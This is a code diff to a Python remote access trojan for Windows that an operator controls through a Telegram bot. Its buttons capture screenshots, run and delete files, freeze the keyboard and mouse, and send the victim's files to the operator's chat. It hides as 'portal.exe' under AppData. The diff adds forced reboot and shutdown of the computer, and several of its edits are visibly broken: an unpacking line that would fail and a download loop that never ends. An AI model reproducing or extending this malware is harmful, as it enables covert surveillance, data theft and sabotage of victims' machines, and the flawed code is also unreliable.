@@ -70,8 +70,10 @@ def on_chat_message(msg):
         [InlineKeyboardButton(text='run <target_file>', callback_data='run')],
         [InlineKeyboardButton(text='Self_Destruct', callback_data='self_destruct')],
         [InlineKeyboardButton(text='arp: Returns ARP Table', callback_data='arp')],
-        [InlineKeyboardButton(text='Reboot the bot', callback_data='reboot')],
+        [InlineKeyboardButton(text='Reboot the bot', callback_data='reboot_bot')],
         [InlineKeyboardButton(text='Upload', callback_data='upload')],
+        [InlineKeyboardButton(text='Reboot the computer', callback_data='reboot_pc')],
+        [InlineKeyboardButton(text='Shutdown the computer', callback_data='shutdown_pc')],
         [InlineKeyboardButton(text='to: <target_computer>, [other_target_computer]', callback_data='to')]
     ])
     bot.sendMessage(chat_id, 'Buttons only please', reply_markup=keyboard)
@@ -79,13 +81,10 @@ def on_chat_message(msg):
     if checkchat_id(chat_id):
         if 'text' in msg:
             print 'Got message from ' + str(chat_id) + ': ' + msg['text']
-            command = msg['text']
-            response = ''
-            if command == '/capture_pc':
-                capture_pc(msg)
 
 
 def on_callback_query(msg):
+    file_name, response, command = ''
     query_id, from_id, query_data = telepot.glance(msg, flavor='callback_query')
     print('Callback Query:', query_id, from_id, query_data)
     if query_data == 'capture_pc':
@@ -96,7 +95,6 @@ def on_callback_query(msg):
         bot.sendDocument(from_id, open('screenshot.jpg', 'rb'))
         os.remove('screenshot.jpg')
     elif query_data == 'arp':
-        response = ''
         bot.sendChatAction(from_id, 'typing')
         lines = os.popen('arp -a -N ' + internalIP())
         for line in lines:
@@ -104,7 +102,6 @@ def on_callback_query(msg):
             response += line
         bot.sendMessage(from_id, response)
     elif query_data == 'delete':
-        command = ''
         command = command.replace('/delete', '')
         path_file = command.strip()
         try:
@@ -125,13 +122,30 @@ def on_callback_query(msg):
                     response = 'File not found'
                     bot.sendMessage(from_id, response)
     elif query_data == 'download':
-        command = ''
         bot.sendChatAction(from_id, 'typing')
         path_file = command.replace('/download', '')
         path_file = path_file[1:]
         if path_file == '':
-            response = '/download C:/path/to/file.name or /download file.name'
+            response = 'Please type the full path to download, for example, "c:\windows\system32\hal.dll"'
             bot.sendMessage(from_id, response)
+            while path_file == '':
+                query_data = path_file
+                bot.message
+            else:
+                bot.sendChatAction(from_id, 'upload_document')
+                try:
+                    bot.sendDocument(from_id, open(path_file, 'rb'))
+                except:
+                    try:
+                        bot.sendDocument(from_id, open(hide_folder + '\\' + path_file))
+                        response = 'Found in hide_folder: ' + hide_folder
+                        bot.sendMessage(from_id, response)
+                    except:
+                        response = 'Could not find ' + path_file
+                        bot.sendMessage(from_id, response)
+            #response = '/download C:/path/to/file.name or /download file.name'
+            #bot.sendMessage(from_id, response)
+
         else:
             bot.sendChatAction(from_id, 'upload_document')
             try:
@@ -145,7 +159,6 @@ def on_callback_query(msg):
                     response = 'Could not find ' + path_file
                     bot.sendMessage(from_id, response)
     elif query_data == 'freeze_keyboard':
-        command = ''
         global keyboardFrozen
         keyboardFrozen = not command.startswith('un')
         hookManager.KeyAll = lambda event: not keyboardFrozen
@@ -161,7 +174,6 @@ def on_callback_query(msg):
         response = 'Keyboard is now enabled'
         bot.sendMessage(from_id, response)
     elif query_data == 'freeze_mouse':
-        command = ''
         global mouseFrozen
         mouseFrozen = not command.startswith('/un')
         hookManager.MouseAll = lambda event: not mouseFrozen
@@ -279,13 +291,11 @@ def on_callback_query(msg):
         bot.sendMessage(from_id, response)
     elif query_data == 'tasklist':
         lines = os.popen('tasklist /FI "STATUS eq RUNNING"')
-        response = ''
         for line in lines:
             line.replace('\n\n', '\n')
             response += line
         bot.sendMessage(from_id, response)
     elif query_data == 'run':
-        command = ''
         bot.sendChatAction(from_id, 'typing')
         path_file = command.replace('/run', '')
         path_file = path_file[1:]
@@ -320,7 +330,6 @@ def on_callback_query(msg):
         while True:
             sleep(10)
     elif query_data == 'to':
-        command = ''
         command = command.replace('/to', '')
         if command == '':
             response = '/to <COMPUTER_1_NAME>, <COMPUTER_2_NAME> /msg_box Hello HOME-PC and WORK-PC'
@@ -337,7 +346,6 @@ def on_callback_query(msg):
         bot.sendMessage(from_id, response)
 
     elif query_data == 'cd':
-        command = ''
         command = command.replace('/cd ', '')
         try:
             os.chdir(command)
@@ -346,8 +354,17 @@ def on_callback_query(msg):
         except:
             response = 'No subfolder matching ' + command
             bot.sendMessage(from_id, response)
+    elif query_data == 'reboot_pc':
+        bot.sendChatAction(from_id, 'typing')
+        command = os.popen('shutdown /r /f /t 0')
+        response = 'Computer will be restarted NOW.'
+        bot.sendMessage(from_id, response)
+    elif query_data == 'shutdown_pc':
+        bot.sendChatAction(from_id, 'typing')
+        command = os.popen('shutdown /s /f /t 0')
+        response = 'Computer will be shutdown NOW.'
+        bot.sendMessage(from_id, response)
     elif query_data == 'upload':  # Upload a file to target
-        file_name = ''
         file_id = None
         if 'document' in msg:
             file_name = msg['document']['file_name']
@@ -369,12 +386,9 @@ def on_callback_query(msg):
 
 me = singleton.SingleInstance()
 
-# ADD YOUR chat_id TO THE LIST BELOW IF YOU WANT YOUR BOT TO ONLY RESPOND TO ONE PERSON!
-known_ids = ''
-# known_ids.append(os.environ['TELE# GRAM_CHAT_ID']) # make sure to remove this line if you don't have this environment variable
-appdata_roaming_folder = 'APPDATA'  # = 'C:\Users\Username\AppData\Roaming'
 # HIDING OPTIONS
 # ---------------------------------------------
+appdata_roaming_folder = 'APPDATA'  # = 'C:\Users\Username\AppData\Roaming'
 hide_folder = appdata_roaming_folder + r'\Portal'  # = 'C:\Users\Username\AppData\Roaming\Portal'
 compiled_name = 'portal.exe'  # Name of compiled .exe to hide in hide_folder, i.e 'C:\Users\Username\AppData\Roaming\Portal\portal.exe'
 # ---------------------------------------------
@@ -401,10 +415,19 @@ with open(log_file, "a") as writing:
     writing.write(user + " Log: " + strftime("%b %d@%H:%M") + "\n\n")
 
 # REPLACE THE LINE BELOW WITH THE TOKEN OF THE BOT YOU GENERATED!
-token = '11111111:1111111111111111111111111111111'  # you can set your environment variable as well
-known_ids = '11111111'
+#token = os.environ['11111111:111111111111111111111111111111111']  # you can set your environment variable as well
+token = '111111111:11111111111111111111111111111111111'
+
+# ADD YOUR chat_id TO THE LIST BELOW IF YOU WANT YOUR BOT TO ONLY RESPOND TO ONE PERSON!
+# known_ids = ''
+# known_ids = []
+# known_ids.append(os.environ['TELE# GRAM_CHAT_ID']) # make sure to remove this line if you don't have this environment variable
+# known_ids.append(os.environ['TELEGRAM_CHAT_ID']) # make sure to remove this line if you don't have this environment variable
+
+#appdata_roaming_folder = os.environ['APPDATA']	# = 'C:\Users\Username\AppData\Roaming'
+
+known_ids = '29951105'
 bot = telepot.Bot(token)
-# bot.message_loop(handle)
 bot.message_loop({'chat': on_chat_message,
                   'callback_query': on_callback_query})
 if len(known_ids) > 0:
